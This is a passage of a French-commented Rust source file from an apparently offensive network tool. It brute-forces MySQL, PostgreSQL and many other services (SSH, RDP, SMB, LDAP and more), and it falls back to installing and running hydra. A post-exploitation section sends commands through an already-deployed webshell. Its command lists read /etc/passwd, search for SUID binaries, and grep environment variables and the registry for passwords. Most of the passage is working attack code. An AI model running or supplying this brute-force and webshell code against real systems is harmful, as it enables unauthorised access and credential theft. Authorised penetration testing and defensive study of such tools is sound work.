    let text = pg_error_text(err);
    match detect_lockout(&text) {
        Some(m) => AttemptOutcome::Locked(format!("PostgreSQL — {} ({})", text, m)),
        None => AttemptOutcome::Failure,
    }
}

/// Calcul du hash MD5 authentification PostgreSQL
/// pg_md5("md5" + md5(md5(pass + user) + salt))
fn pg_md5_password(user: &str, pass: &str, salt: &[u8]) -> String {
    // Real PostgreSQL MD5 password: "md5" + md5(md5(pass + user) + salt)
    let inner_input = format!("{}{}", pass, user);
    let inner_hash = format!("{:x}", md5::compute(inner_input.as_bytes()));

    let mut outer_input = inner_hash.into_bytes();
    outer_input.extend_from_slice(salt);
    let outer_hash = format!("{:x}", md5::compute(&outer_input));

    format!("md5{}", outer_hash)
}

// ─────────────────────────────────────────────────────────────────────────────
// 7. MySQL — handshake v10, `mysql_native_password` / `caching_sha2_password`
//
// Le greeting v10 annonce le plugin *par défaut du serveur*, mais c'est le
// plugin du **compte** qui décide : le serveur l'impose après coup par un
// `AuthSwitchRequest` (0xFE). Savoir répondre aux deux plugins couvre donc
// aussi bien un MariaDB (natif) qu'un MySQL 8 dont le compte est en
// `mysql_native_password`.
//
// La branche « full authentication » de `caching_sha2_password` (0x04) exige le
// chiffrement du mot de passe : soit la clé publique RSA du serveur
// (`RSA-OAEP`/SHA-1), soit un canal TLS. Les deux voies sont couvertes — le
// canal chiffré est obtenu en amont par un `SSLRequest` suivi d'une bascule TLS
// sur la même socket. Aucune tentative n'est convertie en succès sans un
// `OK_Packet` (0x00) du serveur : aucun faux positif n'est possible.
// ─────────────────────────────────────────────────────────────────────────────

const MYSQL_CLIENT_LONG_PASSWORD: u32 = 0x0000_0001;
const MYSQL_CLIENT_PROTOCOL_41: u32 = 0x0000_0200;
const MYSQL_CLIENT_SSL: u32 = 0x0000_0800;
const MYSQL_CLIENT_SECURE_CONNECTION: u32 = 0x0000_8000;
const MYSQL_CLIENT_PLUGIN_AUTH: u32 = 0x0008_0000;

/// Transport du dialogue MySQL : socket nue **ou** flux TLS issu de l'upgrade
/// `SSLRequest`. Le `Box<dyn _>` permet de réutiliser le même code d'échange.
trait MysqlIo: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
impl<T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send> MysqlIo for T {}

/// Plafond de lecture d'un paquet MySQL (protection anti-flux hostile).
const MYSQL_MAX_PACKET: usize = 16 * 1024 * 1024;

/// Greeting v10 décodé : version serveur, sel de 20 octets et plugin annoncé.
#[derive(Debug, Clone)]
struct MysqlGreeting {
    server_version: String,
    capabilities: u32,
    nonce: Vec<u8>,
    auth_plugin: String,
}

/// Décode un greeting v10 (payload **sans** l'en-tête de 4 octets).
/// Renvoie `None` si le paquet n'est pas un handshake exploitable ; toutes les
/// lectures sont bornées (aucun panic possible sur un paquet malformé).
fn parse_mysql_greeting(payload: &[u8]) -> Option<MysqlGreeting> {
    if *payload.first()? != 0x0A {
        return None;
    } // protocole v10
    let mut i = 1usize;

    let vstart = i;
    while *payload.get(i)? != 0 {
        i += 1;
    }
    let server_version = String::from_utf8_lossy(&payload[vstart..i]).to_string();
    i += 1; // '\0'
    i += 4; // connection id

    let mut nonce = payload.get(i..i + 8)?.to_vec(); // auth-plugin-data part 1
    i += 8;
    i += 1; // filler

    let cap_lo = u16::from_le_bytes([*payload.get(i)?, *payload.get(i + 1)?]) as u32;
    i += 2;
    i += 1; // charset
    i += 2; // status flags
    let cap_hi = u16::from_le_bytes([*payload.get(i)?, *payload.get(i + 1)?]) as u32;
    i += 2;
    let capabilities = cap_lo | (cap_hi << 16);

    let auth_len = *payload.get(i).unwrap_or(&0) as usize; // auth_plugin_data_len
    i += 1;
    i += 10; // reserved

    if capabilities & MYSQL_CLIENT_SECURE_CONNECTION != 0 {
        let part2_len = if auth_len > 8 { auth_len - 8 } else { 13 };
        if let Some(part2) = payload.get(i..i + part2_len) {
            // Le dernier octet est le terminateur nul du sel.
            nonce.extend_from_slice(&part2[..part2.len().saturating_sub(1)]);
        }
        i += part2_len;
    }
    nonce.truncate(20);

    let mut auth_plugin = String::new();
    if capabilities & MYSQL_CLIENT_PLUGIN_AUTH != 0 {
        let start = i;
        while *payload.get(i).unwrap_or(&0) != 0 {
            i += 1;
        }
        auth_plugin =
            String::from_utf8_lossy(payload.get(start..i).unwrap_or_default()).to_string();
    }

    Some(MysqlGreeting {
        server_version,
        capabilities,
        nonce,
        auth_plugin,
    })
}

/// `SHA1(pass) XOR SHA1(sel + SHA1(SHA1(pass)))` — réponse `mysql_native_password`.
/// Chaîne vide si le mot de passe est vide (le serveur attend 0 octet).
fn mysql_scramble_native(password: &str, nonce: &[u8]) -> Vec<u8> {
    use sha1::{Digest, Sha1};
    if password.is_empty() {
        return Vec::new();
    }
    let p1 = Sha1::digest(password.as_bytes());
    let p2 = Sha1::digest(&p1);
    let mut buf = Vec::with_capacity(nonce.len() + 20);
    buf.extend_from_slice(nonce);
    buf.extend_from_slice(&p2);
    let p3 = Sha1::digest(&buf);
    p1.iter().zip(p3.iter()).map(|(a, b)| a ^ b).collect()
}

/// `SHA256(pass) XOR SHA256(SHA256(SHA256(pass)) + sel)` — réponse
/// `caching_sha2_password` (32 octets).
fn mysql_scramble_caching_sha2(password: &str, nonce: &[u8]) -> Vec<u8> {
    use sha2::{Digest, Sha256};
    if password.is_empty() {
        return Vec::new();
    }
    let p1 = Sha256::digest(password.as_bytes());
    let p2 = Sha256::digest(&p1);
    let mut buf = Vec::with_capacity(nonce.len() + 32);
    buf.extend_from_slice(&p2);
    buf.extend_from_slice(nonce);
    let p3 = Sha256::digest(&buf);
    p1.iter().zip(p3.iter()).map(|(a, b)| a ^ b).collect()
}

/// Réponse d'authentification selon le plugin exigé. Un plugin inconnu
/// (`sha256_password`, `auth_gssapi_client`, `ed25519`…) produit une réponse
/// vide : le serveur refusera, et aucun succès ne sera inventé.
fn mysql_auth_response(plugin: &str, password: &str, nonce: &[u8]) -> Vec<u8> {
    match plugin {
        "caching_sha2_password" => mysql_scramble_caching_sha2(password, nonce),
        "mysql_native_password" | "" => mysql_scramble_native(password, nonce),
        _ => Vec::new(),
    }
}

/// Clair de la branche « full authentication » : le mot de passe terminé par un
/// octet nul puis **XOR cyclique** avec le sel du handshake (algorithme
/// `caching_sha2_password`, [MySQL §4.1.3]). Séparé du chiffrement RSA pour
/// être testable sans clé.
fn mysql_full_auth_plaintext(password: &str, nonce: &[u8]) -> Vec<u8> {
    let mut plain = Vec::with_capacity(password.len() + 1);
    plain.extend_from_slice(password.as_bytes());
    plain.push(0x00); // terminateur
    if !nonce.is_empty() {
        let n = nonce.len();
        for (i, b) in plain.iter_mut().enumerate() {
            *b ^= nonce[i % n];
        }
    }
    plain
}

/// Branche « full authentication » hors TLS : le clair (mot de passe XOR sel)
/// est chiffré par la **clé publique RSA** du serveur en `RSA-OAEP`/SHA-1 —
/// c'est exactement ce que fait le client officiel quand la connexion n'est pas
/// chiffrée.
fn mysql_rsa_encrypt_password(password: &str, nonce: &[u8], pem: &str) -> Option<Vec<u8>> {
    use rsa::pkcs8::DecodePublicKey;
    use rsa::{Oaep, RsaPublicKey};
    let key = RsaPublicKey::from_public_key_pem(pem).ok()?;
    let plain = mysql_full_auth_plaintext(password, nonce);
    key.encrypt(&mut rand::thread_rng(), Oaep::new::<sha1::Sha1>(), &plain)
        .ok()
}

/// Encapsule un payload dans un paquet MySQL (longueur 3 octets LE + séquence).
fn mysql_packet(seq: u8, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(4 + len);
    out.push((len & 0xFF) as u8);
    out.push(((len >> 8) & 0xFF) as u8);
    out.push(((len >> 16) & 0xFF) as u8);
    out.push(seq);
    out.extend_from_slice(payload);
    out
}

/// Lit un paquet MySQL complet : `(séquence, payload)`. Générique sur le
/// transport (socket nue ou flux TLS).
async fn mysql_read_packet<S>(stream: &mut S, timeout: Duration) -> Result<(u8, Vec<u8>), ()>
where
    S: MysqlIo,
{
    let hdr = read_n(stream, 4, timeout).await?;
    let len = (hdr[0] as usize) | ((hdr[1] as usize) << 8) | ((hdr[2] as usize) << 16);
    if len > MYSQL_MAX_PACKET {
        return Err(());
    }
    let payload = read_n(stream, len, timeout).await?;
    Ok((hdr[3], payload))
}

/// `SSLRequest` : les 32 premiers octets d'un `HandshakeResponse41` — flags
/// (dont `CLIENT_SSL`), taille max de paquet, jeu de caractères et réserve — et
/// **rien d'autre**. Le serveur répond en clair par un « OK » implicite puis la
/// connexion est reprise en TLS : le `HandshakeResponse41` complet, lui, part
/// ensuite *à l'intérieur* du canal chiffré ([MySQL §4.1.1]).
fn mysql_ssl_request(server_caps: u32) -> Vec<u8> {
    let mut flags = MYSQL_CLIENT_LONG_PASSWORD
        | MYSQL_CLIENT_PROTOCOL_41
        | MYSQL_CLIENT_SECURE_CONNECTION
        | MYSQL_CLIENT_SSL;
    if server_caps & MYSQL_CLIENT_PLUGIN_AUTH != 0 {
        flags |= MYSQL_CLIENT_PLUGIN_AUTH;
    }

    let mut p = Vec::with_capacity(32);
    p.extend_from_slice(&flags.to_le_bytes());
    p.extend_from_slice(&(16u32 * 1024 * 1024).to_le_bytes()); // max packet size
    p.push(0x21); // utf8mb4_general_ci
    p.extend_from_slice(&[0u8; 23]); // reserved
    p
}

/// `HandshakeResponse41` — flags, jeu de caractères, utilisateur, réponse
/// d'authentification et (si le serveur l'accepte) nom du plugin. `ssl` ajoute
/// `CLIENT_SSL` (obligatoire dans la réponse renvoyée sur le canal chiffré).
fn mysql_handshake_response(
    user: &str,
    auth: &[u8],
    plugin: &str,
    server_caps: u32,
    ssl: bool,
) -> Vec<u8> {
    let mut flags =
        MYSQL_CLIENT_LONG_PASSWORD | MYSQL_CLIENT_PROTOCOL_41 | MYSQL_CLIENT_SECURE_CONNECTION;
    if server_caps & MYSQL_CLIENT_PLUGIN_AUTH != 0 {
        flags |= MYSQL_CLIENT_PLUGIN_AUTH;
    }
    if ssl {
        flags |= MYSQL_CLIENT_SSL;
    }

    let mut p = Vec::with_capacity(64 + user.len() + auth.len());
    p.extend_from_slice(&flags.to_le_bytes());
    p.extend_from_slice(&(16u32 * 1024 * 1024).to_le_bytes()); // max packet size
    p.push(0x21); // utf8mb4_general_ci
    p.extend_from_slice(&[0u8; 23]); // reserved
    p.extend_from_slice(user.as_bytes());
    p.push(0x00); // fin du nom d'utilisateur
    p.push(auth.len() as u8); // longueur réponse auth
    p.extend_from_slice(auth);
    if flags & MYSQL_CLIENT_PLUGIN_AUTH != 0 {
        p.extend_from_slice(plugin.as_bytes());
        p.push(0x00);
    }
    p
}

/// Message du paquet ERROR (0xFF) : saute le code et le `SQLSTATE` s'ils sont là.
fn mysql_error_text(body: &[u8]) -> String {
    let start = if body.len() > 4 && body.get(3) == Some(&b'#') {
        9
    } else {
        3
    };
    body.get(start..)
        .map(|b| String::from_utf8_lossy(b).to_string())
        .unwrap_or_default()
}

/// Tente une authentification MySQL complète (handshake + réponse au plugin).
/// Le mode TLS est privilégié quand le serveur l'annonce : il est le seul à
/// franchir un serveur en `require_secure_transport` et il permet d'envoyer le
/// mot de passe « full auth » sans dépendre de la clé publique RSA.
async fn try_mysql_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut s)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let Ok((seq, greeting)) = mysql_read_packet(&mut s, timeout).await else {
        return AttemptOutcome::Error;
    };
    let Some(g) = parse_mysql_greeting(&greeting) else {
        return AttemptOutcome::Error;
    };

    let plugin = if g.auth_plugin.is_empty() {
        "mysql_native_password".to_string()
    } else {
        g.auth_plugin.clone()
    };
    let seq = seq.wrapping_add(1);

    // Serveur annonçant `CLIENT_SSL` : `SSLRequest` en clair puis bascule TLS
    // sur *la même* socket ; la suite du dialogue part chiffrée.
    if g.capabilities & MYSQL_CLIENT_SSL != 0 {
        let req = mysql_ssl_request(g.capabilities);
        if write_all_to(&mut s, &mysql_packet(seq, &req), timeout)
            .await
            .is_err()
        {
            return AttemptOutcome::Error;
        }
        let Some(tls) = insecure_tls_connect(s, host, timeout).await else {
            return AttemptOutcome::Error;
        };
        let mut stream: Box<dyn MysqlIo> = Box::new(tls);
        return mysql_auth_exchange(
            &mut stream,
            &g,
            &plugin,
            user,
            pass,
            seq.wrapping_add(1),
            true,
            timeout,
        )
        .await;
    }

    let mut stream: Box<dyn MysqlIo> = Box::new(s);
    mysql_auth_exchange(&mut stream, &g, &plugin, user, pass, seq, false, timeout).await
}

/// Suite du dialogue `HandshakeResponse41` : OK / ERR terminent, un
/// `AuthSwitchRequest` relance un tour, un « Auth More Data » (0x01) porte la
/// bascule d'authentification (`caching_sha2_password`). `on_tls` indique que le
/// transport est déjà chiffré : la branche « full authentication » y envoie
/// alors le mot de passe **en clair** (terminé par un octet nul), sans XOR du
/// sel ni chiffrement RSA.
async fn mysql_auth_exchange<S>(
    stream: &mut S,
    g: &MysqlGreeting,
    plugin0: &str,
    user: &str,
    pass: &str,
    seq0: u8,
    on_tls: bool,
    timeout: Duration,
) -> AttemptOutcome
where
    S: MysqlIo,
{
    let mut plugin = plugin0.to_string();
    let mut seq = seq0;
    let mut cur_nonce = g.nonce.clone(); // sel courant (mis à jour sur AuthSwitch)
    let mut payload = mysql_handshake_response(
        user,
        &mysql_auth_response(&plugin, pass, &g.nonce),
        &plugin,
        g.capabilities,
        on_tls,
    );

    if write_all_to(stream, &mysql_packet(seq, &payload), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    seq = seq.wrapping_add(1);

    // Boucle courte : OK / ERR terminent, `AuthSwitchRequest` relance un tour.
    for _ in 0..4 {
        let Ok((_, body)) = mysql_read_packet(stream, timeout).await else {
            return AttemptOutcome::Error;
        };

        match body.first().copied() {
            Some(0x00) => {
                return AttemptOutcome::Success(format!(
                    "MySQL {} — {}:{} authentifié (plugin {}, canal {})",
                    g.server_version,
                    user,
                    pass,
                    plugin,
                    if on_tls { "TLS" } else { "clair" },
                ));
            }
            Some(0xFF) => {
                let code = if body.len() >= 3 {
                    u16::from_le_bytes([body[1], body[2]])
                } else {
                    0
                };
                let text = mysql_error_text(&body);
                // 1129 = hôte bloqué (trop d'erreurs), 1130 = hôte non autorisé.
                if matches!(code, 1129 | 1130) || detect_lockout(&text).is_some() {
                    return AttemptOutcome::Locked(format!("MySQL {} — {}", code, text.trim()));
                }
                return AttemptOutcome::Failure;
            }
            Some(0xFE) => {
                // AuthSwitchRequest : « plugin\0 » suivi du nouveau sel.
                let rest = &body[1..];
                let cut = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
                let asked = String::from_utf8_lossy(&rest[..cut]).to_string();
                let mut nonce = rest.get(cut + 1..).unwrap_or(&[]).to_vec();
                if nonce.last() == Some(&0) {
                    nonce.pop();
                }
                nonce.truncate(20);

                plugin = if asked.is_empty() {
                    "mysql_native_password".to_string()
                } else {
                    asked
                };
                cur_nonce = nonce.clone();
                payload = mysql_auth_response(&plugin, pass, &nonce); // AuthSwitchResponse
                if write_all_to(stream, &mysql_packet(seq, &payload), timeout)
                    .await
                    .is_err()
                {
                    return AttemptOutcome::Error;
                }
                seq = seq.wrapping_add(1);
            }
            Some(0x01) => match body.get(1).copied() {
                // 0x03 = « fast auth success » : le serveur enchaîne avec OK.
                Some(0x03) => continue,
                // 0x04 = authentification complète.
                Some(0x04) if plugin == "caching_sha2_password" => {
                    let sent = if on_tls {
                        // Canal chiffré : le clair (mot de passe + NUL) suffit —
                        // c'est le chemin utilisé par le client officiel en TLS.
                        let clear = mysql_full_auth_plaintext(pass, &[]);
                        write_all_to(stream, &mysql_packet(seq, &clear), timeout).await
                    } else {
                        // Socket nue : clé publique RSA demandée (paquet 0x02)
                        // puis clair (XOR sel) chiffré en RSA-OAEP/SHA-1.
                        if write_all_to(stream, &mysql_packet(seq, &[0x02]), timeout)
                            .await
                            .is_err()
                        {
                            return AttemptOutcome::Error;
                        }
                        seq = seq.wrapping_add(1);
                        let Ok((_, keypkt)) = mysql_read_packet(stream, timeout).await else {
                            return AttemptOutcome::Error;
                        };
                        if keypkt.first().copied() != Some(0x01) {
                            return AttemptOutcome::Failure;
                        }
                        let pem = String::from_utf8_lossy(&keypkt[1..]).to_string();
                        let Some(enc) = mysql_rsa_encrypt_password(pass, &cur_nonce, &pem) else {
                            return AttemptOutcome::Error;
                        };
                        write_all_to(stream, &mysql_packet(seq, &enc), timeout).await
                    };
                    if sent.is_err() {
                        return AttemptOutcome::Error;
                    }
                    seq = seq.wrapping_add(1);
                }
                _ => return AttemptOutcome::Failure,
            },
            _ => return AttemptOutcome::Failure,
        }
    }

    AttemptOutcome::Error
}

pub async fn brute_mysql(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "mysql",
        &target,
        |user, pass| async move { try_mysql_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result(
                "mysql",
                host,
                port,
                u,
                p,
                proof,
                start.elapsed().as_millis(),
            )
        })
        .collect();

    BruteReport {
        target,
        service: "mysql".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

fn extract_mysql_version(buf: &[u8]) -> String {
    // Skip packet header (4 bytes) + protocol version (1 byte)
    if buf.len() < 6 {
        return "unknown".into();
    }
    let start = 5;
    let end = buf[start..].iter().position(|&b| b == 0).unwrap_or(20);
    String::from_utf8_lossy(&buf[start..start + end]).to_string()
}

// ─────────────────────────────────────────────────────────────────────────────
// 8. Dispatcher : détecte le service et appelle le bon brute
// ─────────────────────────────────────────────────────────────────────────────

/// Lance le bruteforce approprié selon le service détecté
pub async fn auto_brute(
    host: &str,
    port: u16,
    service: &str,
    is_https: bool,
    cfg: &BruteConfig,
) -> Option<BruteReport> {
    match service {
        "ftp" => Some(brute_ftp(host, port, cfg).await),
        "redis" => Some(brute_redis(host, port, cfg).await),
        "postgresql" | "postgres" => Some(brute_postgresql(host, port, cfg).await),
        "http" | "https" => {
            let paths = web_admin_paths();
            let report = brute_http_basic(host, port, is_https, &paths, cfg).await;
            Some(report)
        }
        "mysql" => Some(brute_mysql(host, port, cfg).await),
        "mongodb" | "mongo" => Some(brute_mongodb(host, port, cfg).await),
        // ── Nouveaux protocoles ──────────────────────────────────────────────
        "winrm" => {
            let is_tls = port == 5986 || is_https;
            Some(brute_winrm(host, port, is_tls, cfg).await)
        }
        "vnc" => Some(brute_vnc(host, port, cfg).await),
        "kubernetes" => {
            let start = std::time::Instant::now();
            let mut successes = Vec::new();
            if let Some(r) = check_kubernetes_unauth(host, port, cfg.timeout).await {
                successes.push(r);
            }
            Some(BruteReport {
                target: format!("{}:{}", host, port),
                service: "kubernetes".into(),
                total_tried: 1,
                successes,
                duration_ms: start.elapsed().as_millis(),
            })
        }
        "mqtt" => {
            let start = std::time::Instant::now();
            let mut successes = Vec::new();
            if let Some(r) = check_mqtt_anonymous(host, port, cfg.timeout).await {
                successes.push(r);
            }
            Some(BruteReport {
                target: format!("{}:{}", host, port),
                service: "mqtt".into(),
                total_tried: 1,
                successes,
                duration_ms: start.elapsed().as_millis(),
            })
        }
        "ssh" => Some(brute_ssh(host, port, cfg).await),
        "smtp" => Some(brute_smtp(host, port, cfg).await),
        "imap" => Some(brute_imap(host, port, cfg).await),
        "pop3" => Some(brute_pop3(host, port, cfg).await),
        "ldap" | "ldap3" => Some(brute_ldap(host, port, cfg).await),
        "mssql" | "ms-sql-s" | "tds" => Some(brute_mssql(host, port, cfg).await),
        "smb" | "microsoft-ds" | "netbios-ssn" => Some(brute_smb(host, port, cfg).await),
        "rdp" | "ms-wbt-server" => Some(brute_rdp(host, port, cfg).await),
        _ => None,
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Repli hydra — services non couverts nativement
// ─────────────────────────────────────────────────────────────────────────────
//
// Quand aucun moteur Rust natif ne gère le service, l'agent s'appuie sur un
// outil tiers (`hydra`) : installation opt-in (`cfg.auto_install`) **puis
// exécution réelle**. Il ne se contente jamais de suggérer la commande.

/// Traduit un nom de service réseau en module hydra. Retourne `None` si le
/// service n'a pas d'équivalent hydra connu — on n'invente pas de module, un
/// nom inconnu ferait échouer hydra sur un « module ne supporte pas ».
fn hydra_module_for(service: &str) -> Option<&'static str> {
    Some(match service {
        "telnet" => "telnet",
        "snmp" => "snmp",
        "sip" => "sip",
        "irc" => "irc",
        "nntp" => "nntp",
        "socks5" | "socks" => "socks5",
        "svn" | "svnserve" => "svn",
        "cvs" | "pserver" => "cvs",
        "rlogin" => "rlogin",
        "rexec" | "exec" => "rexec",
        "vmauthd" | "vmware-auth" => "vmauthd",
        "asterisk" => "asterisk",
        "teamspeak" => "teamspeak",
        "xmpp" | "jabber" => "xmpp",
        "icq" => "icq",
        "pcanywhere" | "pcanywheredata" => "pcanywhere",
        "radmin" | "radmin2" => "radmin2",
        "rtsp" => "rtsp",
        "firebird" => "firebird",
        "sapr3" => "sapr3",
        "s7-300" => "s7-300",
        "cisco" => "cisco",
        "oracle-listener" | "oracle" => "oracle-listener",
        "http-proxy" | "proxy" => "http-proxy",
        _ => return None,
    })
}

/// Extrait les couples (login, password) des lignes de sortie hydra :
/// `[port][module] host: 10.0.0.5   login: bob   password: s3cr3t`
fn parse_hydra_found(text: &str) -> Vec<(String, String)> {
    let mut found: Vec<(String, String)> = Vec::new();
    for line in text.lines() {
        if !line.contains("login:") || !line.contains("password:") {
            continue;
        }
        let user = line
            .split("login:")
            .nth(1)
            .and_then(|s| s.split("password:").next())
            .map(|s| s.trim().to_string())
            .unwrap_or_default();
        let pass = line
            .split("password:")
            .nth(1)
            .map(|s| s.trim().to_string())
            .unwrap_or_default();
        if !user.is_empty() && !found.iter().any(|(u, p)| *u == user && *p == pass) {
            found.push((user, pass));
        }
    }
    found
}

/// Bruteforce d'un service **non couvert nativement** via l'outil tiers
/// `hydra`.
///
/// L'outil est installé à la demande (`cfg.auto_install`) puis **exécuté réellement**
/// avec les paires de `cfg.credential_pairs()`. Retourne `None` si hydra reste
/// indisponible (jamais installé) ou si le service n'a aucun module hydra.
pub async fn brute_via_hydra(
    host: &str,
    port: u16,
    service: &str,
    cfg: &BruteConfig,
) -> Option<BruteReport> {
    let module = hydra_module_for(service)?;

    // Outil tiers : installation opt-in, fail-closed sinon.
    if !crate::installer::ensure_tool("hydra", cfg.auto_install, cfg.assume_yes).await {
        return None;
    }
    if !which_in_path("hydra") {
        return None;
    }

    let pairs = cfg.credential_pairs();
    if pairs.is_empty() {
        return None;
    }

    // Fichier « login:pass » au format `-C` de hydra, dans le dossier
    // temporaire, avec des noms uniques par processus.
    let tmp_dir = std::env::temp_dir();
    let stamp = std::process::id();
    let creds_path = tmp_dir.join(format!("diapile_hydra_{}.txt", stamp));
    let out_path = tmp_dir.join(format!("diapile_hydra_{}.out", stamp));

    let mut body = String::new();
    for (u, p) in &pairs {
        // Un « : » dans le login casserait le format `login:pass` : on l'écarte.
        if u.contains(':') {
            continue;
        }
        body.push_str(u);
        body.push(':');
        body.push_str(p);
        body.push('\n');
    }
    if std::fs::write(&creds_path, body).is_err() {
        return None;
    }
    // Un fichier de résultats résiduel fausserait la lecture : on le purge.
    let _ = std::fs::remove_file(&out_path);

    // Bornage temporel dur : au pire `pairs` connexions de `per_conn` secondes,
    // réparties sur `cfg.max_parallel` tâches, plus une marge de démarrage.
    let per_conn = cfg.timeout.as_secs().max(3);
    let batches = (pairs.len() / cfg.max_parallel.max(1)) as u64 + 1;
    let deadline = Duration::from_secs((batches * per_conn + 20).min(600));

    let creds_arg = creds_path.to_string_lossy().to_string();
    let out_arg = out_path.to_string_lossy().to_string();
    let target = format!("{}://{}:{}", module, host, port);
    let tasks = cfg.max_parallel.max(1).to_string();
    let wait = per_conn.to_string();

    println!(
        "  \x1b[36m[HYDRA]\x1b[0m {} — {} paire(s), module '{}'",
        target,
        pairs.len(),
        module
    );

    let start = std::time::Instant::now();

    // hydra est lancé puis surveillé dans un thread bloquant dédié : la sortie
    // de secours est désactivée (Stdio::null) car `-o` fournit déjà un fichier
    // exploitable par machine. En cas de dépassement, le processus est tué —
    // pas de hydra orphelin qui continuerait à tirer sur la cible.
    let ran = tokio::task::spawn_blocking(move || {
        let mut child = match std::process::Command::new("hydra")
            .arg("-C")
            .arg(&creds_arg) // fichier login:pass
            .arg("-I") // ignorer un éventuel hydra.restore
            .arg("-f") // s'arrêter au premier succès
            .arg("-t")
            .arg(&tasks) // tâches parallèles
            .arg("-W")
            .arg(&wait) // attente par connexion (s)
            .arg("-o")
            .arg(&out_arg) // résultats dans un fichier
            .arg(&target)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
        {
            Ok(c) => c,
            Err(_) => return false,
        };

        let began = std::time::Instant::now();
        loop {
            match child.try_wait() {
                Ok(Some(_)) => return true,
                Ok(None) if began.elapsed() >= deadline => {
                    let _ = child.kill();
                    let _ = child.wait();
                    return true;
                }
                Ok(None) => std::thread::sleep(Duration::from_millis(200)),
                Err(_) => return false,
            }
        }
    })
    .await
    .unwrap_or(false);

    // Nettoyage du fichier d'identifiants (best-effort).
    let _ = std::fs::remove_file(&creds_path);

    let found: Vec<(String, String)> = if ran {
        std::fs::read_to_string(&out_path)
            .map(|t| parse_hydra_found(&t))
            .unwrap_or_default()
    } else {
        Vec::new()
    };
    let _ = std::fs::remove_file(&out_path);

    let successes = found
        .into_iter()
        .map(|(u, p)| {
            brute_result(
                service,
                host,
                port,
                u,
                p,
                "hydra".into(),
                start.elapsed().as_millis(),
            )
        })
        .collect();

    Some(BruteReport {
        target: format!("{}:{}", host, port),
        service: service.into(),
        total_tried: pairs.len(),
        successes,
        duration_ms: start.elapsed().as_millis(),
    })
}

// ─────────────────────────────────────────────────────────────────────────────
// Post-exploitation : commandes d'énumération via webshell HTTP
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostEnumResult {
    pub host: String,
    pub port: u16,
    pub command: String,
    pub output: String,
    pub success: bool,
}

/// Exécute une commande via un webshell déjà déployé (cmd= paramètre)
pub async fn post_exec_webshell(
    host: &str,
    port: u16,
    is_https: bool,
    webshell_path: &str,
    cmd_param: &str,
    command: &str,
    timeout: Duration,
) -> PostEnumResult {
    let scheme = if is_https { "https" } else { "http" };
    let url = format!(
        "{}://{}:{}{}?{}={}",
        scheme,
        host,
        port,
        webshell_path,
        cmd_param,
        urlencoding::encode(command)
    );

    let client = reqwest::Client::builder()
        .timeout(timeout)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();

    match client.get(&url).send().await {
        Ok(r) => {
            let output = r.text().await.unwrap_or_default();
            PostEnumResult {
                host: host.into(),
                port,
                command: command.into(),
                output,
                success: true,
            }
        }
        Err(e) => PostEnumResult {
            host: host.into(),
            port,
            command: command.into(),
            output: e.to_string(),
            success: false,
        },
    }
}

/// Commandes d'énumération système standard (OS-agnostic best-effort)
pub fn enum_commands_linux() -> Vec<&'static str> {
    vec![
        "id",
        "whoami",
        "uname -a",
        "hostname",
        "cat /etc/passwd | head -20",
        "cat /etc/os-release",
        "ip addr show || ifconfig",
        "ip route show || route -n",
        "ss -tulpn || netstat -tulpn",
        "ps aux | head -20",
        "ls /home/",
        "find / -perm -4000 -type f 2>/dev/null | head -10",
        "sudo -l 2>/dev/null",
        "cat /etc/crontab",
        "env | grep -i pass | head -5",
    ]
}

pub fn enum_commands_windows() -> Vec<&'static str> {
    vec![
        "whoami /all",
        "systeminfo | findstr /B /C:\"OS\"",
        "net user",
        "net localgroup administrators",
        "ipconfig /all",
        "netstat -ano",
        "tasklist",
        "wmic product get name",
        "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services | findstr /i pass",
        "dir C:\\Users\\",
    ]
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_credential_pairs_limited() {
        let cfg = BruteConfig::quick();
        let pairs = cfg.credential_pairs();
        assert!(pairs.len() <= cfg.max_attempts);
        // Must include admin:admin
        assert!(pairs.iter().any(|(u, p)| u == "admin" && p == "admin"));
    }

    #[test]
    fn test_default_wordlists_not_empty() {
        assert!(!default_usernames().is_empty());
        assert!(!default_passwords().is_empty());
    }

    #[test]
    fn test_load_wordlist_filters_dedups_and_trims() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("users.txt");
        std::fs::write(
            &path,
            "# commentaire\n\
            \n  admin  \nroot\nadmin\n\t\n#root\nsvc_account\r\nroot\n",
        )
        .unwrap();

        let list = load_wordlist(path.to_str().unwrap()).unwrap();
        // Commentaires, lignes vides et doublons écartés ; bords nettoyés ;
        // `\r\n` (wordlist Windows) géré par `lines()` + `trim()`.
        assert_eq!(list, vec!["admin", "root", "svc_account"]);
        assert!(!list.iter().any(|l| l.contains(' ') || l.contains('\r')));

        // Le nom nu est résolu via `resolve_config_path` : un chemin absolu
        // inexistant doit échouer explicitement, pas silencieusement.
        let missing = dir.path().join("absent.txt");
        let err = load_wordlist(missing.to_str().unwrap()).unwrap_err();
        assert!(err.contains("illisible"), "message inattendu : {}", err);

        // Fichier sans entrée utile → erreur explicite (pas de liste vide).
        let empty = dir.path().join("empty.txt");
        std::fs::write(&empty, "\n# rien\n   \n").unwrap();
        assert!(load_wordlist(empty.to_str().unwrap())
            .unwrap_err()
            .contains("vide"));
